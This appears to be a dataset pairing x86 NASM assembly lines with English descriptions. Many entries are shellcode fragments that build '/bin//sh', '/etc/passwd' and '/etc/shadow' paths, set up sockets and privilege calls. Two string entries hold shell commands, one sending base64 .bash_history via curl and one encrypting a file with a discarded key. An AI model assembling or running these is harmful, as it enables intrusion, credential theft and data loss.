mov ebx, 4	invoke subroutine listen
mov ebx, 5	invoke subroutine accept
mov ebx, 5	move 5 into ebx
mov ebx, 9	move number 9 into ebx
mov ebx, buff	move buff to ebx
mov ebx, command	move command into ebx
mov ebx, dword 0x5090508f	move dword 0x5090508f into ebx
mov ebx, dword 0x50905091	move dword 0x50905091 into ebx
mov ebx, eax	move eax into ebx
mov ebx, eax	move the address in eax into ebx
mov ebx, eax	move the contents of the eax register into the ebx register
mov ebx, ecx	move ecx into ebx
mov ebx, edi	move edi into ebx
mov ebx, edx	move edx into ebx
mov ebx, esi	move esi into ebx
mov ebx, esp	move address of stack pointer into ebx
mov ebx, esp	move esp into ebx
mov ebx, esp	move the address of the character on the stack into ebx
mov ebx, esp	move the contents of the esp register into the ebx register
mov ebx, esp	point ebx to stack
mov ebx, esp	push /bin/sh into ebx
mov ebx, filename	move filename into ebx
mov ebx, m_src1	move m_src1 to ebx
mov ebx, m_src2	move m_src2 to ebx
mov ebx, msg	move the address of msg string into ebx
mov ebx, n	move n to ebx
mov ebx, name	move name into ebx
mov ebx, request	move address of request variable into ebx
mov ebx, sock_reg	move sock_reg into ebx
mov ebx, type var3	move the number of bytes of var3 into ebx
mov ebx, upcase	move the value of upcase into ebx
mov ebx, x	move the contents of x into ebx
mov ebx, zero_reg	move zero_reg into ebx
mov ecx, [ebp+12]	move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
mov ecx, [ebp+12]	move the contents of the address [ebp+12] into ecx
mov ecx, [esi+4*eax]	move the 4 bytes of data at address esi+4*eax into ecx
mov ecx, [esp]	move the contents of esp into ecx
mov ecx, [esp]	move the contents of the esp register into the ecx register
mov ecx, [my_table]	move effective address of my_table in ecx
mov ecx, [temp3]	move the contents at memory address temp3 to ecx
mov ecx, [x]	move the contents at memory address x to ecx
mov ecx, 0777	move permissions to read write and execute into ecx
mov ecx, 0x0	move 0x0 into ecx
mov ecx, 0x1	move 0x1 into ecx
mov ecx, 0x88998899	move 0x88998899 into ecx
mov ecx, 1	move 1 into ecx
mov ecx, 36	get 36 in the ecx
mov ecx, 4294948047	move 4294948047 into ecx
mov ecx, 672274793	move the value 672274793 into the ecx register
mov ecx, arguments	move the address of the arguments into ecx
mov ecx, array	move the first element of array into ecx
mov ecx, array2	move the first element in array2 into ecx
mov ecx, b	move b to ecx
mov ecx, buff	move buff to ecx
mov ecx, buffer	move the memory address of buffer variable into ecx
mov ecx, contents	move the memory address of contents string into ecx
mov ecx, contents	move the memory address of contents variable into ecx
mov ecx, donemsg	move donemsg into ecx
mov ecx, eatmsg	move eatmsg into ecx
mov ecx, eax	move eax into ecx
mov ecx, ebp	move ebp into ecx
mov ecx, edi	move edi into ecx
mov ecx, edx	move edx into ecx
mov ecx, edx	move the contents of the edx register into the ecx register
mov ecx, esi	move esi into ecx
mov ecx, esp	ecx point to the top of the stack
mov ecx, esp	move address of arguments into ecx
mov ecx, esp	move address of stack pointer into ecx
mov ecx, esp	move esp into ecx
mov ecx, esp	move the address of the stack pointer into ecx
mov ecx, esp	move the contents of esp into ecx
mov ecx, esp	move the contents of the esp register into the ecx register
mov ecx, esp	point ecx to the top of the stack
mov ecx, esp	save the memory location of arg[0] into the ecx register
mov ecx, filecontents	move the memory address of our file contents variable into ecx
mov ecx, hello	put the offset of hello in ecx
mov ecx, hexstr	move hexstr into ecx
mov ecx, m_src3	move m_src3 to ecx
mov ecx, msg	move msg to ecx
mov ecx, msg	move the address of message string into ecx
mov ecx, msg	move the memory address of message string into ecx
mov ecx, offset array	move starting address of array to ecx
mov ecx, readbuffer	move readbuffer into ecx
mov ecx, request	move address of request variable into ecx
mov ecx, response	move address of response variable into ecx
mov ecx, rm	move rm to ecx
mov ecx, rn	move rn to ecx
mov ecx, type var2	move the number of bytes of var2 into ecx
mov ecx, y	move the contents of y into ecx
mov edi, [ebp+16]	move value the contents of memory address ebp+16 into edi
mov edi, 0x343997b7	move 0x343997b7 into edi
mov edi, 0x3734b117	move 0x3734b117 into edi
mov edi, 0x978cd092	move 0x978cd092 into edi
mov edi, 0x978cd0d0	move 0x978cd0d0 into edi
mov edi, 0xada67373	move 0xada67373 into edi
mov edi, 876189623	move 876189623 into edi
mov edi, 884021143	move 884021143 into edi
mov edi, eax	move eax into edi
mov edi, eax	move the return value of sys_socketcall into edi
mov edi, ecx	move ecx into edi
mov edi, ecx	move ecx to edi
mov edi, edx	move edx into edi
mov edi, edx	move the remainder into edi
mov edi, esi	move esi into edi
mov edi, esp	move esp into edi
mov edi, hexstr	place hexstr into edi
mov edx, [esi+4*ebx]	move the 4 bytes of data at address esi+4*ebx into edx
mov edx, [esp]	move the contents of the esp register into the edx register
mov edx, [temp4]	move the contents at memory address temp4 to edx
mov edx, [z]	move the contents at memory address z to edx
mov edx, 0x1234567	move the value 0x1234567 into the edx register
mov edx, 1	move 1 into edx
mov edx, 11	move integer 11 to edx
mov edx, 12	move 12 to edx
mov edx, 13	move 13 into edx
mov edx, 2	move decimal 2 into edx
mov edx, 255	move decimal number 255 into edx
mov edx, 3	move 3 decimal into edx
mov edx, 43	move 43 decimal into edx
mov edx, 43	move decimal 43 into edx
mov edx, 66729180	move 66729180 into edx
mov edx, 78	move decimal 78 into edx
mov edx, 78	store 78 decimal into edx
mov edx, 8	move 8 decimal into edx
mov edx, 8	put 8 into edx
mov edx, 9	move number 9 into edx
mov edx, buff	move buff to edx
mov edx, bufflen	move bufflen into edx
mov edx, donelen	move donelen into edx
mov edx, dword 0x65676760	move dword 0x65676760 into edx
mov edx, dword 0x65676760	move the doubleword 0x65676760 into edx
mov edx, eatlen	move eatlen into edx
mov edx, eax	move eax into edx
mov edx, ebp	move ebp into edx
mov edx, ecx	move ecx into edx
mov edx, ecx	move ecx to edx
mov edx, environment	move the address of environment variable into edx
mov edx, esi	move esi into edx
mov edx, esp	move address of stack pointer into edx
mov edx, esp	move esp into edx
mov edx, esp	move the contents of the esp register into the edx register
mov edx, esp	move the stack pointer into edx
mov edx, filename	move filename into edx
mov edx, hellolen	move hellolen into edx
mov edx, hexlen	move hexlen into edx
mov edx, len	move variable len to edx
mov edx, m_src4	move m_src4 to edx
mov edx, n	move n to edx
mov edx, readbuffer	move readbuffer into edx
mov edx, readlen	move readlen into edx
mov edx, response	move address of response variable into edx
mov edx, src	move the contents of src variable into edx
mov edx, tmp	move the contents of tmp variable into edx
mov edx, type var1	move the number of bytes of var1 into edx
mov esi, [ebp+12]	move the contents of memory address ebp+12 into esi
mov esi, 0x222933f0	move 0x222933f0 into esi
mov esi, 0x243525f0	move 0x243525f0 into esi
mov esi, 0x34399797	move 0x34399797 into esi
mov esi, 0x353ffc3b	move 0x353ffc3b into esi
mov esi, 0x563a1f3e	move 0x563a1f3e into esi
mov esi, 0x65636170	move 0x65636170 into esi
mov esi, 0x68732f2f	move 0x68732f2f into esi
mov esi, 0x72702f2f	move 0x72702f2f into esi
mov esi, 0x735f6176	move 0x735f6176 into esi
mov esi, 0x91969dd0	move 0x91969dd0 into esi
mov esi, 0xd2c45e5e	move 0xd2c45e5e into esi
mov esi, 10	move 10 into esi
mov esi, 9	move 9 into esi
mov esi, buff	place address buff into esi
mov esi, eax	move eax into esi
mov esi, eax	move pointer in eax into esi
mov esi, ecx	move ecx into esi
mov esi, edx	move remainder into esi
mov esi, esp	move esp into esi
mov esi, v	move v to esi
mov esi, v_src	move v_src to esi
mov esi, var	copy the address of var into esi
mov esp, ebp	move the contents of the ebp register ino the esp register
mov esp, ebp	move the contents of the ebp register into the esp register
mov long [esi+18], esi	move the contents of the esi register into the long starting at the address [esi+18]
mov long [esi+22], ebx	move the contents of the ebx register into the long starting at the address [esi+22]
mov long [esi+22], esi	move the contents of the esi register into the long starting at the address [esi+22]
mov long [esi+26], eax	move the contents of the eax register into the long starting at the address [esi+26]
mov long [esi+26], ebx	move the contents of the ebx register into the long starting at the address [esi+26]
mov long [esi+30], eax	move the contents of the eax register into the long starting at the address [esi+30]
mov sock_reg, eax	move eax into sock_reg
mov total, 48	transfer the value 48 in the memory variable total
mov word [ebx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
mov word [ecx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx
mov word [esp+0x1], 0x776f	move 0x776f into the word in [esp+0x1]
mov x, eax	move eax to x variable
msg db 'hello, world!', 0xa	declare msg string containing 'hello world!'
msg db 'i love you!', 0ah	define msg variable and initialize with 'i love you!'
msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a	define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a	define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
msg db 'we found the egg!', 0ah, 0dh	define msg as the byte string 'we found the egg!'
msg_len equ $-msg	define msg_len equal to the length of msg
msg1 db 'hello, brave new world!', 0ah	declare message string msg1 containing 'hello brave new world!'
msg2 db 'this is how we recycle in nasm.', 0ah	declare message string msg2 containing 'this is how we recycle in nasm'
msg2 db 'passwd', 0x00	define msg2 as the byte string 'passwd'
msglength: equ 12	declare msglength to have the constant value 12
mul [tmp]	multiply the contents of eax by the 32-bit contents of the memory location tmp
mul [value]	multiply the contents of eax by the 32-bit contents of the memory location value
mul [var]	multiply the contents of eax by the 32-bit contents of the memory location var
mul 0x10	multiply eax by 0x10 and stores the result in edx:eax
mul 25	multiply the contents of eax by 25
mul 3	multiply the contents of eax by 3
mul ebx	mul eax by ebx
mul ebx	multiply eax by ebx
mul ebx	multiply eax by the contents of the ebx register
mul ebx	multiply the contents of eax by ebx
mul ebx	multiply the contents of the eax register by the contents of the ebx register
mul ecx	mul eax by ecx
mul ecx	multiply eax by ecx
mul ecx	multiply eax by the contents of the ecx register
mul ecx	mutliply eax by ecx
mul edx	mul eax by edx
mul edx	multiply eax by edx
mul edx	multiply eax by the contents of the edx register
my_table times 10 dw 0	allocate 10 words each initialized to 0
my_table times 10 dw 0	allocate my_table vector of 10 words each initialized to 0
my_var dw 0abcdh	define my_var word variable and initialize it to 0abcdh
myList word 1,2,3,4,5	define myList array of word and initialize it to 1, 2, 3, 4, and 5
name db '/bin/sh', 0	define name as the byte string '/bin/sh'
name db 30 dup	allocate memory for 30 bytes uninitialized name variable
neg eax	negate eax
neg eax	negate the contents of eax
neg eax	replaces the contents of the eax register with its two's complement
neg ebx	replaces the contents of the ebx register with its two's complement
neg ecx	replaces the contents of the ecx register with its two's complement
neg edi	negate edi
neg edi	replaces the contents of the edi register with its two's complement
neg edx	replaces the contents of the edx register with its two's complement
neg var	negate the contents of var
neg_number dw -12345	define the variable neg_number of words and initialize it to -12345
negative:	define negative label
next_addr:	declare next_addr function
next_addr:	declare the next_addr label
next_cycle:	declare the next_cycle label
next_cycle:	define next_cycle label
next_page:	declare next_page function
next:	declare the next label
nop	do no operation
nop	do nothing
nop	no operation
not ax	negate all the bits of ax register
not ax	negate all the bits of the ax register
not byte [esi]	perform a bit-wise inversion of the byte starting at the address in esi
not byte [tmp]	negate all bits in the byte at the memory location tmp
not byte [var]	negate all bits in the byte at the memory location var
not byte [var2]	negate all bits in the byte at the memory location var2
not dl	negate all the bits of dl register
not eax	negate all the bits of the eax register
not ecx	negate all the bits of ecx register
not ecx	negate all the bits of the ecx register
not edi	negate all the bits of the edi register
not edx	perform a bit-wise inversion of edx
not esi	negate all the bits of the esi register
not word ax	negate all the bits of the word at the address ax
number dw 12345	define number variable of a word and initialize to 12345
number: resb 1	reserve 1 byte for number variable
numbers dw 34, 45, 56, 67, 75, 89	declare an array of six words each initialized with the numbers 34 45 56 67 75 89
odd_number:	declare odd_numer function
one:	declare one label
one:	declare the one label
or al, bl	perform or operation between al and bl registers
or al, syscall_execve	perform or operation between the al register and syscall_execve
or cx, 0xfff	perform logical or between the cx register and 0xfff
or dx, 0xfff	perform or operation between dx and 0xfff and save the result into dx
or eax, 0xffffffff	perform the or operation between the eax register and 0xffffffff
output:	declare the output label
path db '//bin/sh'	define path as the byte string '//bin/sh'
path db '//bin/sh'	define the byte string path and initialize it to '//bin/sh'
path:	declare the path label
pop [eax]	pop the top element of the stack into memory at the four bytes starting at location eax
pop [ebx]	pop the top element of the stack into memory at the four bytes starting at location ebx
pop ax	pop the last element pushed onto the stack into ax
pop bx	pop the last element pushed onto the stack into bx
pop cx	pop the last element pushed onto the stack into cx
pop cx	pop the value on the stack back into cx
pop cx	restore the top of the stack into the cx register
pop dx	pop the value on the stack back into dx
pop dx	restore the top of the stack into the dx register
pop eax	pop the next argument off the stack into eax
pop eax	pop the top of the stack into the eax register
pop eax	pop the value on the stack back into eax
pop eax	put syscall value into eax
pop eax	remove last character from the stack into eax
pop eax	remove last character from the stack into edx
pop eax	restore eax from the value we pushed onto the stack at the start
pop eax	restore the original value of eax
pop eax	restore the top of the stack into eax register
pop eax	restore the top of the stack into the eax register
pop ebp	restore ebp register
pop ebp	restore the top of the stack into the ebp register
pop ebx	pop the value on the stack back into ebx
pop ebx	remove last character from the stack into ebx
pop ebx	restore ebx from the value we pushed onto the stack at the start
pop ebx	restore the original value of ebx
pop ebx	restore the top of the stack into ebx register
pop ebx	restore the top of the stack into the ebx register
pop ecx	pop the value on the stack back into ecx
pop ecx	remove last character from the stack into ecx
pop ecx	restore ecx from the value we pushed onto the stack at the start
pop ecx	restore ecx register
pop ecx	restore the top of the stack into the ecx register
pop ecx \n loop l1 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l2 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l3 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
pop edi	pop the top element of the stack into edi
pop edi	restore the top of the stack into the edi register
pop edx	pop the top of the stack into the edx register
pop edx	pop the value on the stack back into edx
pop edx	restore edx from the value we pushed onto the stack at the start
pop edx	restore the top of the stack into edx register
pop edx	restore the top of the stack into the edx register
pop esi	pop the top of the stack into the esi register
pop esi	pop the value on the stack back into esi
pop esi	restore esi from the stack
pop esi	restore esi from the value we pushed onto the stack at the start
pop esi	restore the top of the stack into esi register
pop esi	restore the top of the stack into the esi register
pop esp	restore the top of the stack into the esp register
pop si	restore the top of the stack into the si register
popad	move doublewords from the stack into the 32 bit registers
popad	move doublewords from the stack into the general purpose registers
popad	pop doublewords from the stack into the 32 bit registers
popad	pop doublewords from the stack into the general purpose registers
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
prepare:	declare the prepare label
priv_setgid:	declare the priv_setgid label
priv_setuid:	declare the priv_setuid label
process_shellcode:	declare the process_shellcode label
push _ip	push _ip onto the stack
push '//pa'	push '//pa' onto the stack
push '//sh'	push '//sh' onto the stack
push '/bin'	push '/bin' onto the stack
push '/etc'	push '/etc' onto the stack
push 'sswd'	push 'sswd' onto the stack
push [tmp]	push the 4 bytes at address tmp onto stack
push [var]	push the 4 bytes at address var onto the stack
push [var2]	push the 4 bytes at address var2 onto the stack
push 0bh	push 0bh onto the stack
push 0x0	push 0x0 onto the stack
push 0x0	push the value 0x0 to the stack
push 0x04020a0a	push 0x04020a0a onto the stack
push 0x0a206873	push 0x0a206873 onto the stack
push 0x0a3a7964	push 0x0a3a7964 onto the stack
push 0x0a4c4c41	push 0x0a4c4c41 onto the stack
push 0x0a4c4c41	push the 0x0a4c4c41 onto the stack
push 0x1	push 0x1 onto the stack
push 0x1	push 0x1 to the stack
push 0x1	push the 0x1 onto the stack
push 0x10	push 0x10 onto the stack
push 0x10	push 0x10 to the stack
push 0x10	push the 0x10 onto the stack
push 0x10	push the value 0x10 onto the stack
push 0x16	push 0x16 onto the stack
push 0x1a	push 0x1a onto the stack
push 0x1a	push 0x1a to the stack
push 0x1c	push 0x1c onto the stack
push 0x1c	push 0x1c to the stack
push 0x2	push 0x2 onto the stack
push 0x2	push 0x2 to the stack
push 0x2	push the 0x2 onto the stack
push 0x203a4457	push 0x203a4457 onto the stack
push 0x203a4457	push the 0x203a4457 onto the stack
push 0x204c4c41	push 0x204c4c41 onto the stack
push 0x204c4c41	push the 0x204c4c41 onto the stack
push 0x2431243a	push 0x2431243a onto the stack
push 0x29	push 0x29 onto the stack
push 0x29	push 0x29 to the stack
push 0x2e312e31	push 0x2e312e31 onto the stack
push 0x2e312e31	push 0x2e312e31 to the stack
push 0x2e323931	push 0x2e323931 onto the stack
push 0x2e323931	push 0x2e323931 to the stack
push 0x2e373231	push 0x2e373231 onto the stack
push 0x2e373231	push 0x2e373231 to the stack
push 0x2e383631	push 0x2e383631 onto the stack
push 0x2e383631	push 0x2e383631 to the stack
push 0x2f2f2f2f	push 0x2f2f2f2f onto the stack
push 0x2f2f2f2f	push 0x2f2f2f2f to the stack
push 0x2f2f2f2f	push the 0x2f2f2f2f onto the stack
push 0x2f2f2f2f \n mov eax, esp	push the value 0x2f2f2f2f onto the stack and point eax to the stack register
push 0x2f2f2f2f \n mov ebx, esp	push the value 0x2f2f2f2f onto the stack and point ebx to the stack register
push 0x2f2f2f2f \n mov ecx, esp	push the value 0x2f2f2f2f onto the stack and point ecx to the stack register
push 0x2f2f2f2f \n mov edi, esp	push the value 0x2f2f2f2f onto the stack and point edi to the stack register
push 0x2f2f2f2f \n mov edx, esp	push the value 0x2f2f2f2f onto the stack and point edx to the stack register
push 0x2f2f2f2f \n mov esi, esp	push the value 0x2f2f2f2f onto the stack and point esi to the stack register
push 0x2f2f2f6e	push the 0x2f2f2f6e onto the stack
push 0x2f3a706d	push 0x2f3a706d onto the stack
push 0x2f3a746f	push 0x2f3a746f onto the stack
push 0x2f656c2d	push 0x2f656c2d onto the stack
push 0x2f656c2d	push the 0x2f656c2d onto the stack
push 0x2f6e6962	push 0x2f6e6962 onto the stack
push 0x2f6e6962	push 0x2f6e6962 to the stack
push 0x30	push the value 0x30 onto the stack
push 0x30313a31	push 0x30313a31 onto the stack
push 0x30313a31	push 0x30313a31 to the stack
push 0x30317974	push 0x30317974 onto the stack
push 0x30317974	push the 0x30317974 onto the stack
push 0x31313131	push 0x31313131 onto the stack
push 0x3131313a	push 0x3131313a onto the stack
push 0x31373737	push 0x31373737 onto the stack
push 0x31373737	push the 0x31373737 onto the stack
push 0x3170762d	push 0x3170762d onto the stack
push 0x3170762d	push 0x3170762d to the stack
push 0x3170762d	push the 0x3170762d onto the stack
push 0x32322e32	push 0x32322e32 onto the stack
push 0x32322e32	push 0x32322e32 to the stack
push 0x3458652e	push 0x3458652e onto the stack
push 0x37373333	push 0x37373333 onto the stack
push 0x37373333	push 0x37373333 to the stack
push 0x37373333	push the 0x37373333 onto the stack
push 0x3a303a3a	push 0x3a303a3a onto the stack
push 0x3a30754a	push 0x3a30754a onto the stack
push 0x3d4c4c41	push 0x3d4c4c41 onto the stack
push 0x3d4c4c41	push the 0x3d4c4c41 onto the stack
push 0x3e0a7964	push 0x3e0a7964 onto the stack
push 0x4	push 0x4 onto the stack
push 0x4	push the 0x4 onto the stack
push 0x45683933	push 0x45683933 onto the stack
push 0x46	push 0x46 onto the stack
push 0x4c4c4128	push 0x4c4c4128 onto the stack
push 0x4c4c4128	push the 0x4c4c4128 onto the stack
push 0x4c5a304b	push 0x4c5a304b onto the stack
push 0x4f4e2029	push 0x4f4e2029 onto the stack
push 0x4f4e2029	push the 0x4f4e2029 onto the stack
push 0x5	push 0x5 onto the stack
push 0x5	push the 0x5 onto the stack
push 0x50446862	push 0x50446862 onto the stack
push 0x53534150	push 0x53534150 onto the stack
push 0x53534150	push the 0x53534150 onto the stack
push 0x6	push 0x6 onto the stack
push 0x6	push the 0x6 value onto the stack
push 0x61622f2f	push 0x61622f2f onto the stack
push 0x61622f6e	push 0x61622f6e onto the stack
push 0x61655220	push 0x61655220 onto the stack
push 0x6168732f	push 0x6168732f onto the stack
push 0x6168732f	push 0x6168732f to the stack
push 0x6168732f	push the 0x6168732f onto the stack
push 0x6168732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x61702f2f	push 0x61702f2f onto the stack
push 0x61702f2f \n push 0x6374652f \n mov eax, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov ebx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov ecx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov edi, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov edx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov esi, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x61702f63	push 0x61702f63 onto the stack
push 0x61702f63	push the 0x61702f63 onto the stack
push 0x622f7273	push 0x622f7273 onto the stack
push 0x622f7273	push 0x622f7273 to the stack
push 0x636e2f2f	push 0x636e2f2f onto the stack
push 0x636e2f2f	push 0x636e2f2f to the stack
push 0x636e2f2f	push the 0x636e2f2f onto the stack
push 0x6374652f	push 0x6374652f onto the stack
push 0x6374652f	push 0x6374652f to the stack
push 0x6374652f	push the 0x6374652f onto the stack
push 0x6374652f \n mov eax, esp	push the value 0x6374652f onto the stack and point eax to the stack register
push 0x6374652f \n mov ebp, esp	push the value 0x6374652f onto the stack and point ebp to the stack register
push 0x6374652f \n mov ebx, esp	push the value 0x6374652f onto the stack and point ebx to the stack register
push 0x6374652f \n mov ecx, esp	push the value 0x6374652f onto the stack and point ecx to the stack register
push 0x6374652f \n mov edi, esp	push the value 0x6374652f onto the stack and point edi to the stack register
push 0x6374652f \n mov edx, esp	push the value 0x6374652f onto the stack and point edx to the stack register
push 0x6374652f \n mov esi, esp	push the value 0x6374652f onto the stack and point esi to the stack register
push 0x64687373	push 0x64687373 onto the stack
push 0x64687373 \n mov eax, esp	push the value 0x64687373 onto the stack and point the eax register to the stack register
push 0x64687373 \n mov ebp, esp	push the value 0x64687373 onto the stack and point the ebp register to the stack register
push 0x64687373 \n mov ebx, esp	push the value 0x64687373 onto the stack and point the ebx register to the stack register
push 0x64687373 \n mov ecx, esp	push the value 0x64687373 onto the stack and point the ecx register to the stack register
push 0x64687373 \n mov edi, esp	push the value 0x64687373 onto the stack and point the edi register to the stack register
push 0x64687373 \n mov edx, esp	push the value 0x64687373 onto the stack and point the edx register to the stack register
push 0x64687373 \n mov esi, esp	push the value 0x64687373 onto the stack and point the esi register to the stack register
push 0x6475732f	push 0x6475732f onto the stack
push 0x6475732f	push 0x6475732f to the stack
push 0x6475732f	push the 0x6475732f onto the stack
push 0x6475732f \n push 0x6374652f \n mov eax, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x6475732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov ecx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov edi, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x6475732f \n push 0x6374652f \n mov edx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov esi, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x64777373	push 0x64777373 onto the stack
push 0x64777373	push the 0x64777373 onto the stack
push 0x6567772f	push 0x6567772f onto the stack
push 0x6567772f	push 0x6567772f to the stack
push 0x656c6966	push 0x656c6966 onto the stack
push 0x656c6966	push the 0x656c6966 onto the stack
push 0x65726f43	push 0x65726f43 onto the stack
push 0x65782e2f	push 0x65782e2f onto the stack
push 0x65782e2f	push 0x65782e2f to the stack
push 0x66	push 0x66 onto the stack
push 0x66	push 0x66 to the stack
push 0x66	push the 0x66 onto the stack
push 0x67513231	push 0x67513231 onto the stack
push 0x6769666e	push 0x6769666e onto the stack
push 0x682f2f2f	push 0x682f2f2f onto the stack
push 0x682f2f2f	push the 0x682f2f2f value onto the stack
push 0x68732f2f	push //sh to the stack
push 0x68732f2f	push 0x68732f2f onto the stack
push 0x68732f2f	push 0x68732f2f to the stack
push 0x68732f2f	push ascii sh// onto stack
push 0x68732f2f	push hs//
push 0x68732f2f	push the 0x68732f2f value onto the stack
push 0x68732f2f	push the value 0x68732f2f onto the stack
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	push /bin/sh onto the stack and point the eax register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	move /bin/sh into eax
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	put ASCII /bin/sh into eax
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push ASCII /bin/sh onto the stack and point the ebx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	put /bin/sh into ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	move ASCII /bin/sh into ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	push /bin/sh onto the stack and point the ecx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	put /bin/sh into ecx
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	move ASCII /bin/sh into ecx
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	move /bin/sh into the ecx register
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	push ASCII /bin/sh onto the stack and point the edx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	put /bin/sh into edx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	move ASCII /bin/sh into edx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	move /bin/sh into the edx register
push 0x68732f6e	push 0x68732f6e onto the stack
push 0x68732f6e	push 0x68732f6e to the stack
push 0x68732f6e	push the 0x68732f6e onto the stack
push 0x68735858	push the value 0x68735858 onto the stack
push 0x68736162	push 0x68736162 onto the stack
push 0x68736162	push 0x68736162 to the stack
push 0x68736164	push 0x68736164 onto the stack
push 0x68736164	push 0x68736164 to the stack
push 0x6873732f	push the value 0x6873732f onto the stack
push 0x6873732f \n push 0x6374652f \n mov eax, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x6873732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov ecx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov edi, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x6873732f \n push 0x6374652f \n mov edx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov esi, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x68737a2f	push 0x68737a2f onto the stack
push 0x69616863	push the 0x69616863 onto the stack
push 0x69622f2f	push 0x69622f2f onto the stack
push 0x69622f2f	push 0x69622f2f to the stack
push 0x69622f2f	push the 0x69622f2f onto the stack
push 0x69622f2f \n mov eax, esp	push the value 0x69622f2f onto the stack and point the eax register to the stack register
push 0x69622f2f \n mov ebx, esp	push the value 0x69622f2f onto the stack and point the ebx register to the stack register
push 0x69622f2f \n mov ecx, esp	push the value 0x69622f2f onto the stack and point the ecx register to the stack register
push 0x69622f2f \n mov edx, esp	push the value 0x69622f2f onto the stack and point the edx register to the stack register
push 0x69622f3a	push 0x69622f3a onto the stack
push 0x69622f65	push 0x69622f65 onto the stack
push 0x69622f65	push 0x69622f65 to the stack
push 0x69622f65	push the 0x69622f65 onto the stack
push 0x6962732f	push 0x6962732f onto the stack
push 0x6962732f	push the 0x6962732f onto the stack
push 0x6c626174	push 0x6c626174 onto the stack
push 0x6d722f2f	push the 0x6d722f2f onto the stack
push 0x6d726574	push 0x6d726574 onto the stack
push 0x6d726574	push 0x6d726574 to the stack
push 0x6e	push the 0x6e onto the stack
push 0x6e69622f	push /bin to the stack
push 0x6e69622f	push 0x6e69622f onto the stack
push 0x6e69622f	push ascii nib/ onto stack
push 0x6e69622f	push nib/
push 0x6e69622f	push the 0x6e69622f onto the stack
push 0x6e69622f	push the value 0x6e69622f onto the stack
push 0x6e69622f \n push 0x7273752f \n mov eax, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov ebx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register
